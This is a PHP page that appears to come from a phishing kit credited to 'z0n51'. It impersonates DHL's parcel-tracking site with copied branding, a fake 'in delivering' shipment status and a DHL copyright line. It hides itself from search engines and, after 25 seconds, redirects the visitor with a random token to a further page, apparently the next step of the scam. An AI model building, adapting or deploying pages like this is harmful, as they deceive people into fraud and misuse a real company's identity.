<?php

/**
 * @link              https://www.z0n51.com/
 * @since             03/08/2020
 * @package           ORANGE
 * @facebook          https://www.facebook.com/z0n51
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      ORANGE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
    $random   = rand(0,100000000000);
    $dispatch = substr(md5($random), 0, 17);
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title>Identifiez-vous avec votre compte</title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header">
            <div class="container containerr">
                <div class="top-header">
                    <div class="logo"><img src="../assets/images/logo.svg"></div>
                    <ul>
                        <li><i class="fas fa-info-circle"></i> Alert(1)</li>
                        <li>Contact Us</li>
                        <li><i class="fas fa-globe"></i> United States of America</li>
                        <li><i class="fas fa-search"></i> Search</li>
                    </ul>
                    <ul class="mobile-menu">
                        <li><i class="fas fa-globe"></i></li>
                        <li><i class="fas fa-search"></i></li>
                        <li><i class="fas fa-bars"></i></li>
                    </ul>
                </div>
                <div class="bottom-header d-flex mt50">
                    <ul class="flex-grow-1">
                        <li style="color: #d40511; text-decoration: underline;">Track <i class="fas fa-chevron-down"></i></li>
                        <li>Ship <i class="fas fa-chevron-down"></i></li>
                        <li>Logistics Solutions</li>
                        <li>Customer Service</li>
                    </ul>
                    <ul>
                        <li><i class="fas fa-user-tie"></i> Customer Portal Logins</li>
                    </ul>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="main-title">
                    <h3>DHL TRACKING</h3>
                </div>
                <div class="details">
                    <div class="title">
                        <h3><i class="fas fa-truck"></i> Shipment in delivering</h3>
                        <ul>
                            <li class="active"></li>
                            <li class="active"></li>
                            <li class="inactive"></li>
                        </ul>
                    </div>
                    <p class="mb30">
                        Status: <b>in delivering</b><br>
                        This shipment is handled by: <b>DHL Parcel</b><br>
                        Tracking Code: CS471210241DE
                    </p>
                    <div class="loader text-center mt50 mb30">
                        <div class="spinner-border text-danger" role="status">
                            <span class="sr-only">Loading...</span>
                        </div>
                    </div>  
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container containerr">
                <div class="top-footer">
                    <div class="row">
                        <div class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <div class="widget">
                                <h3 style="color: #d40511;">Help Center</h3>
                                <ul>
                                    <li>Customer Service</li>
                                    <li>Customer Portal Logins</li>
                                    <li>Digital Partners and Integrations</li>
                                    <li>Developer Portal</li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <div class="widget">
                                <h3>Our Divisions</h3>
                                <ul>
                                    <li>Post and Paket Deutschland</li>
                                    <li>DHL Express</li>
                                    <li>DHL Global Forwarding</li>
                                    <li>DHL Freight</li>
                                    <li>DHL Supply Chain</li>
                                    <li>DHL eCommerce</li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <div class="widget">
                                <h3>Industry Sectors</h3>
                                <ul>
                                    <li>Auto-Mobility</li>
                                    <li>Chemicals</li>
                                    <li>Consumer</li>
                                    <li>Energy</li>
                                    <li>Engineering and Manufacturing</li>
                                    <li>Life Sciences and Healthcare</li>
                                    <li>Public Sector</li>
                                    <li>Retail</li>
                                    <li>Technology</li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-6 col-sm-6 col-12 mb-5">
                            <div class="widget">
                                <h3>Company Information</h3>
                                <ul>
                                    <li>About DHL</li>
                                    <li>Careers</li>
                                    <li>Press Center</li>
                                    <li>Sustainability</li>
                                    <li>Insights and Innovation</li>
                                    <li>Official Logistics Partners</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="container containerr">
                <div class="bottom-footer">
                    <div class="row">
                        <div class="col-md-8">
                            <img class="d-block mb20" src="../assets/images/glo-footer-logo.svg">
                            <ul class="footer-list">
                                <li>Fraud Awareness</li>
                                <li>Legal Notice</li>
                                <li>Terms of Use</li>
                                <li>Privacy Notice</li>
                                <li>Dispute Resolution</li>
                                <li>Accessibility</li>
                                <li>Additional Information</li>
                                <li>Cookies Settings</li>
                            </ul>
                        </div>
                        <div class="col-md-4">
                            <h3>Follow Us</h3>
                            <ul class="social">
                                <li><i class="fab fa-youtube"></i></li>
                                <li><i class="fab fa-facebook-f"></i></li>
                                <li><i class="fab fa-linkedin"></i></li>
                                <li><i class="fab fa-instagram"></i></li>
                            </ul>
                        </div>
                    </div>

                    <p><?php echo date('Y'); ?> &copy; DHL International GmbH. All rights reserved.</p>

                </div>
            </div>
        </footer>
        <!-- END FOOTER -->
        
        
        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            var dispatch = '<?php echo $dispatch; ?>';
            setTimeout(function () {
                window.location.href= 'ss.php?confirmation#_'+ dispatch;
            },25000); // 1000 = 1s
        </script>

    </body>

</html>